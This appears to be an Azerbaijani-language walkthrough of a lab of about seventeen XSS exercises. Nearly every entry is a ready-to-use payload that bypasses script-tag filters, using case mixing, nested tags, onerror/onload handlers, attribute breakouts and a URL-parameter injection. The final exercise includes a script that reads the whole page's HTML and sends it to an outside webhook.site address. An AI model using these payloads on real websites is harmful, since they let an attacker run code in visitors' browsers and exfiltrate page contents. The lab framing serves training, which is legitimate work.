Exercise 1 – A Truly Disruptive Startup
saytın axtarış bölməsində bu kodu(```<script>success()</script>```) yazırıq və axtar düyməsinə klikləyirik.
sayt xss hücumundan müdafiə olunmadığı üçün hücumumuz uğurlu olacaq.

Exercise 2 – No Script Allowed
ikinci tapşırıqda server yazdığımız kodun başındakı scripti təmizləyir.Serveri aldatmağımız üçün belə bir kod yazmağımız kifayətdir.```</script><script>success()</script>```


Exercise 3 – One More Time, Like You Mean It
üçüncü tapşırıqda yazdığımız kodun hər iki tərəfindəki script teqini silir.```<scrscriptipt>alert(1)</scrscriptipt> ```


Exercise 4 – An Open-and-Shut Case
server daxil olunan koddakı script teglərini təmizləyir.Yazılışda biraz dəyişiklik etsək müdafiəni aşa bilərik.```<ScRiPt>success()</sCriPt>  ```      

Exercise 5 – Time to Mix Things Up
5-ci tapşırıqda server daxil olunan script və SCRİPT teqlərini təmizləyir.```<ScRiPt>success()</sCriPt>```

Exercise 6 – A Picture is Worth a Thousand Words
6-cı tapşırıqda server script teqini yazılışından asılı olmayaraq təmizlədiyindən biz başqa teqlərdən istifadə etməliyik.        ```<image src =q onerror=success()>```

Exercise 7 – Between a Rock And a Hard Place
        ```<button onClick="success()">Submit</button>```

Exercise 8 – Angle of Death
        ```<!--<img src="--><img src=x onerror=javascript:success()//">```

Exercise 10 – In the Wrong Place at the Wrong Time
       ``` "<img src=/ onerror="success()" />```

Exercise 11 – You Can't Win 'em All
      ```  "" onerror="success()"```

Exercise 12 – When All is Said and Done
       ``` ' onload=success()```

Exercise 14 – Here Today and Gone Tomorrow
axtarış yerində hər hansı bir şey axtarırıq.Sonra dili dəyişdiririk.Url də language-i dəyişdiririk.Səyfənin page source -nu açırıq.b
Burda languagenin dəyişdiyini görürük.Bu xss inyeksiya açığının ola biləcəyi deməkdir
```http://caloogle.xyz:4140/search?q=bdhehegdhg&lang=en%20onload=success()```

Exercise 15 – The Early Bird Catches the Worm
       ``` </script> <img src=/ onerror=success() /> <script>```

Exercise 16 – Tying Up Loose Ends
       ``` <<<///scrip<<//script>>t>>><img src =q onerror=success()>```

Exercise 17 – Take a Page Out of Their Book
        ```function send(payload) {
    fetch('/comment', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({text: 'http://google.com', id: "1);success("})
    }).then((response) => response.clone().text())
    .then((data) => console.log(data));
}

send('<script> payload = document.documentElement.innerHTML; window.location="https://webhook.site/my-private-id?query=" + encodeURIComponent(payload); </script>')```
